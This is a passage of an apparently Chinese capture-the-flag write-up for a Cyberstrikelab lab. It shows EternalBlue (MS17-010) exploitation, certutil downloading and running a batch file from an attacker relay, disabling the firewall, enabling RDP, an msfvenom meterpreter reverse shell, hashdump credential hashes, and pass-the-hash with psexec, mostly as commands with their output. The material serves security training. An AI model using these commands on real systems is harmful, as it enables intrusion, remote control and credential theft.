class=\"hljs-number\"\u003e20.30\u003c/span\u003e\nmsf6 \u003cspan class=\"hljs-title function_ invoke__\"\u003eauxiliary\u003c/span\u003e(admin/smb/ms17_010_command) \u003e set command whoami\ncommand =\u003e whoami\nmsf6 \u003cspan class=\"hljs-title function_ invoke__\"\u003eauxiliary\u003c/span\u003e(admin/smb/ms17_010_command) \u003e run\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Target OS: Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 Standard \u003cspan class=\"hljs-number\"\u003e7600\u003c/span\u003e\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Built a write-what-where primitive...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Overwrite complete... SYSTEM session obtained!\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Service start timed out, OK \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e running a command \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e non-service executable...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Getting the command output...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Executing cleanup...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Cleanup was successful\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Command completed successfully!\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Output \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"whoami\"\u003c/span\u003e:\n\nnt authority\\system\n\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.30\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e     - Scanned \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e of \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003ehosts\u003c/span\u003e (\u003cspan class=\"hljs-number\"\u003e100\u003c/span\u003e% complete)\n[*] Auxiliary module execution completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功执行，准备上线 \u003ccode\u003eVshell\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e通过 \u003ccode\u003estowaway\u003c/code\u003e 将监听端口映射到 \u003ccode\u003e192.168.20.10\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e(node \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) \u003e\u003e backward \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e\n[*] Trying to ask node to listen on \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1234\u003c/span\u003e......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Backward start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过 \u003ccode\u003ems17_010\u003c/code\u003e 进行上线\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eset command \u003cspan class=\"hljs-string\"\u003e\"certutil.exe -urlcache -split -f http://192.168.20.10:1234/swt C:\\\\run.bat\"\u003c/span\u003e\nrun\nset command \u003cspan class=\"hljs-string\"\u003e\"start C:\\\\run.bat\"\u003c/span\u003e\nrun\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eC\u003c/code\u003e 盘根目录能找到第二个 \u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003ego-flag{R0M4QwsS6EQp97lw}\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e关闭防火墙和开启远程桌面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eC:\\Windows\\system32\u003enetsh advfirewall set allprofiles state off\n确定。\n\nC:\\Windows\\system32\u003eREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003eServer /v fDenyTSConnections /t REG_DWORD /d \u003cspan class=\"hljs-number\"\u003e00000000\u003c/span\u003e /f\n操作成功完成。\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e信息收集，发现该机器就是 DC\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eC:\\Windows\\system32\u003enet view\n服务器名称            注解\n\n-------------------------------------------------------------------------------\n\\\\CYBERWEB\n\\\\WIN-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eNRTJO59O7N\n命令成功完成。\n\nPS C:\\\u003e net view /domain\nDomain\n\n-------------------------------------------------------------------------------\nCYBERSTRIKELAB\n命令成功完成。\n\nC:\\Windows\\system32\u003enet view /domain\nDomain\n\n-------------------------------------------------------------------------------\nCYBERSTRIKELAB\n命令成功完成。\n\nC:\\Windows\\system32\u003enet group \u003cspan class=\"hljs-string\"\u003e\"domain controllers\"\u003c/span\u003e\n组名     Domain Controllers\n注释     域中所有域控制器\n\n成员\n\n-------------------------------------------------------------------------------\nWIN-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eNRTJO59O7N$\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上线 \u003ccode\u003eMSF\u003c/code\u003e ，和上面上线 \u003ccode\u003eVshell\u003c/code\u003e的操作类似\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e(node \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e) \u003e\u003e backward \u003cspan class=\"hljs-number\"\u003e9009\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e9009\u003c/span\u003e\n[*] Trying to ask node to listen on \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e9009\u003c/span\u003e......\n[*] Waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e agent\u003cspan class=\"hljs-string\"\u003e's response......\n[*] Backward start successfully!\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003emsf6 \u003cspan class=\"hljs-title function_ invoke__\"\u003eexploit\u003c/span\u003e(multi/handler) \u003e set lport \u003cspan class=\"hljs-number\"\u003e9009\u003c/span\u003e\nlport =\u003e \u003cspan class=\"hljs-number\"\u003e9009\u003c/span\u003e\nmsf6 \u003cspan class=\"hljs-title function_ invoke__\"\u003eexploit\u003c/span\u003e(multi/handler) \u003e options\n\nPayload \u003cspan class=\"hljs-title function_ invoke__\"\u003eoptions\u003c/span\u003e (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit \u003cspan class=\"hljs-title function_ invoke__\"\u003etechnique\u003c/span\u003e (\u003cspan class=\"hljs-attr\"\u003eAccepted\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e, seh, thread, process, none)\n   LHOST     \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e          yes       The listen \u003cspan class=\"hljs-title function_ invoke__\"\u003eaddress\u003c/span\u003e (an \u003cspan class=\"hljs-keyword\"\u003einterface\u003c/span\u003e may be specified)\n   LPORT     \u003cspan class=\"hljs-number\"\u003e9009\u003c/span\u003e             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e   Wildcard Target\n\nView the full module info with the info, \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e info -d command.\n\nmsf6 \u003cspan class=\"hljs-title function_ invoke__\"\u003eexploit\u003c/span\u003e(multi/handler) \u003e run\n[*] Started reverse TCP handler on \u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e0.0\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e9009\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e➜  Lab1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.10\u003c/span\u003e LPORT=\u003cspan class=\"hljs-number\"\u003e9009\u003c/span\u003e -f exe -o shell.exe\n[-] No platform was selected, choosing \u003cspan class=\"hljs-title class_\"\u003eMsf\u003c/span\u003e::\u003cspan class=\"hljs-variable constant_\"\u003eModule\u003c/span\u003e::\u003cspan class=\"hljs-variable constant_\"\u003ePlatform\u003c/span\u003e::\u003cspan class=\"hljs-variable constant_\"\u003eWindows\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\n[-] No arch selected, selecting arch: x64 \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e the payload\nNo encoder specified, outputting raw payload\nPayload size: \u003cspan class=\"hljs-number\"\u003e510\u003c/span\u003e bytes\nFinal size of exe file: \u003cspan class=\"hljs-number\"\u003e7168\u003c/span\u003e bytes\nSaved \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e: shell.exe\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将 \u003ccode\u003eshell.exe\u003c/code\u003e 上传到 \u003ccode\u003e192.168.20.30\u003c/code\u003e ，然后运行\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/CyberstrikelabLab-1/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e抓取 \u003ccode\u003ehash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003emeterpreter \u003e hashdump\nAdministrator:\u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003ebd5248e87cb7f2f9b871d40c903927:::\nGuest:\u003cspan class=\"hljs-number\"\u003e501\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003ed6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:\u003cspan class=\"hljs-number\"\u003e502\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:\u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003ebc02b7670084dd30471730cc0a1672c:::\ncyberweb:\u003cspan class=\"hljs-number\"\u003e1105\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:\u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003ede5cd0f15d1c070851d1044e1d95c90:::\nWIN-\u003cspan class=\"hljs-number\"\u003e7\u003c/span\u003eNRTJO59O7N$:\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:f056ff4d1ad036e570c5344bb3d4e65c:::\nCYBERWEB$:\u003cspan class=\"hljs-number\"\u003e1103\u003c/span\u003e:aad3b435b51404eeaad3b435b51404ee:c9f108dc7ba78e084283c00e33dffeff:::\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e192.168.20.20\u003c/h2\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e➜  Lab1 proxychains -q nxc smb \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.20\u003c/span\u003e -u administrator -H \u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003ebd5248e87cb7f2f9b871d40c903927 \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.20\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    CYBERWEB         [*] Windows \u003cspan class=\"hljs-number\"\u003e8.1\u003c/span\u003e / Server \u003cspan class=\"hljs-number\"\u003e2012\u003c/span\u003e R2 Build \u003cspan class=\"hljs-number\"\u003e9600\u003c/span\u003e \u003cspan class=\"hljs-title function_ invoke__\"\u003ex64\u003c/span\u003e (\u003cspan class=\"hljs-attr\"\u003ename\u003c/span\u003e:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True) \nSMB         \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e20.20\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e    CYBERWEB         [+] cyberstrikelab.com\\administrator:\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003ebd5248e87cb7f2f9b871d40c903927 (Pwn3d!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ePTH\u003c/code\u003e 拿下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003e➜  Lab1 proxychains -q psexec.py cyberstrikelab.com/administrator@cyberweb.cyberstrikelab.com -hashes aad3b435b51404eeaad3b435b51404ee:\u003cspan class=\"hljs-number\"\u003e94\u003c/span\u003ebd5248e87cb7f2f9b871d40c903927\n  import pkg_resources\nImpacket v0.\u003cspan class=\"hljs-number\"\u003e12.0\u003c/span\u003e - Copyright Fortra, LLC \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e its affiliated companies \n\n[*] Requesting shares on cyberweb.cyberstrikelab.com.....\n[*] Found writable share ADMIN$\n[*] Uploading file pqpIKIBX.exe\n[*] Opening SVCManager on cyberweb.cyberstrikelab.com.....\n[*] Creating service WhKD on cyberweb.cyberstrikelab.com.....\n[*] Starting service WhKD.....\n[!] Press help \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https:\u003cspan class=\"hljs-comment\"\u003e//docs.python.org/3/library/codecs.html#standard-encodings\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e then execute smbexec.py again with -codec \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e the corresponding codec\nMicrosoft Windows [�汾 \u003cspan class=\"hljs-number\"\u003e6.3\u003c/span\u003e.\u003cspan class=\"hljs-number\"\u003e9600\u003c/span\u003e]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https:\u003cspan class=\"hljs-comment\"\u003e//docs.python.org/3/library/codecs.html#standard-encodings\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e then execute smbexec.py again with -codec \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e the corresponding \u003cspan class=\"hljs-title function_ invoke__\"\u003ecodec\u003c/span\u003e\n(c) \u003cspan class=\"hljs-number\"\u003e2013\u003c/span\u003e Microsoft Corporation����������Ȩ����\n\nC:\\Windows\\system32\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e读取第三个 \u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-php\"\u003eC:\\\u003e type flag.txt\ngo-flag{Nb8VOT8X9SbIzyDI}\n\u003c/code\u003e\u003c/pre\u003e","title":"Cyberstrikelab - Lab1","date":"2025-08-12","updated":"2025-08-12","tags":["Cyberstrikelab","Windows","Vshell","多层内网","MS17_010"],"categories":"靶机","comments":true,"description":"Lab-1\n\n https://www.cyberstrikelab.com/#/scene/detail/20\n \n\nYoucms\n\n`youcms`\n\n\n\n网上能找到 `youcms` 前台 `getshell` 的利用\n\n https://blog.csdn.net/qq_48985780/article/details/121945304\n \n\n\n\n访问返回包中的 `preview/xxx..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"CyberstrikelabLab-1"},"buildId":"nq5t09qnH8ePVEpcyZyT3","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>